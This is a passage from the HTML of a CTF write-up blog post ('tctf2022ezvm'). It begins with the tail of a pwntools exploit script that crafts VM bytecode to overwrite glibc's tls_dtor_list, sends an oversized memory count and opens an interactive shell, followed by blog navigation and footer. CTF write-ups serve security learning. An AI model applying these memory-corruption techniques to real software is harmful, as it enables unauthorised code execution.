class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#change the tls_dtor_list</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,heap_offset-<span class="number">0x100</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">sub()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,tls_dtor_list_heap_offset+<span class="number">0x20</span>)	<span class="comment">#list = heap_address</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b exit&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(code)))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;continue&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your code size:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1f0</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your memory count:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x6000000000008000</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2022-09-20 14:11:19" itemprop="dateModified" datetime="2022-09-20T14:11:19+08:00">2022-09-20</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="dreamcat WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="dreamcat Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="dreamcat PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>dreamcat <i class="ic i-at"><em>@</em></i>我他喵的
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2022/09/20/tctf2022ezvm/" title="tctf2022ezvm">http://example.com/2022/09/20/tctf2022ezvm/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclh3brzpj20zk0m8ann.jpg" title="glibc-2.35一些手法">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>glibc-2.35一些手法</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.</span> <span class="toc-text"> 思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text"> exp</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2022/03/19/pwnable-seethefile/" rel="bookmark" title="pwnable_seethefile">pwnable_seethefile</a></li><li><a href="/2022/03/20/buuoj-heapcreator/" rel="bookmark" title="buuoj_heapcreator">buuoj_heapcreator</a></li><li><a href="/2022/03/21/roarctf-2019-easypwn/" rel="bookmark" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></li><li><a href="/2022/03/22/tw2017parrot/" rel="bookmark" title="tw2017parrot">tw2017parrot</a></li><li><a href="/2022/04/01/note-file/" rel="bookmark" title="note_file">note_file</a></li><li><a href="/2022/04/01/tcache-tear/" rel="bookmark" title="tcache_tear">tcache_tear</a></li><li><a href="/2022/04/10/pwnable-bookwriter/" rel="bookmark" title=""></a></li><li><a href="/2022/04/14/heap-paradise/" rel="bookmark" title="heap_paradise">heap_paradise</a></li><li><a href="/2022/04/18/starctf_examination/" rel="bookmark" title="examination">examination</a></li><li><a href="/2022/04/19/starctf-babynote/" rel="bookmark" title="starctf_babynote">starctf_babynote</a></li><li><a href="/2022/04/25/MRCTF-ezbash/" rel="bookmark" title="MRCTF_ezbash">MRCTF_ezbash</a></li><li><a href="/2022/05/10/chunzhiIOT/" rel="bookmark" title="chunzhiIOT">chunzhiIOT</a></li><li><a href="/2022/05/10/torghast/" rel="bookmark" title="torghast">torghast</a></li><li><a href="/2022/05/13/pwnable-re-alloc/" rel="bookmark" title="pwnable-re-alloc">pwnable-re-alloc</a></li><li><a href="/2022/06/18/ciscn2022-syscall/" rel="bookmark" title="ciscn2022_syscall">ciscn2022_syscall</a></li><li><a href="/2022/06/19/ciscn-2022-popcalc/" rel="bookmark" title="ciscn_2022_popcalc">ciscn_2022_popcalc</a></li><li><a href="/2022/06/20/ciscn-2022-planecoode/" rel="bookmark" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></li><li class="active"><a href="/2022/09/20/tctf2022ezvm/" rel="bookmark" title="tctf2022ezvm">tctf2022ezvm</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="dreamcat"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">dreamcat</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">33</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/18/starctf_examination/" title="examination">examination</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/05/10/torghast/" title="torghast">torghast</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/12/%E9%80%86%E5%90%91%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95/" title="逆向常见算法">逆向常见算法</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/begin/" title="In begin">begin</a>
+</div>
+
+    <span><a href="/2021/03/19/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/03/19/pwnable-seethefile/" title="pwnable_seethefile">pwnable_seethefile</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/mobile/" title="In mobile">mobile</a>
+</div>
+
+    <span><a href="/2022/07/18/adworld-%E5%9F%BA%E7%A1%80%E7%9A%84android/" title="adworld_基础的android">adworld_基础的android</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/pwn/" title="In pwn">pwn</a>
+</div>
+
+    <span><a href="/2022/06/18/ciscn2022-syscall/" title="ciscn2022_syscall">ciscn2022_syscall</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2022</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="Symbols count total">282k words</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="Reading time total">4:16</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2022/09/20/tctf2022ezvm/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)dreamcat?"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
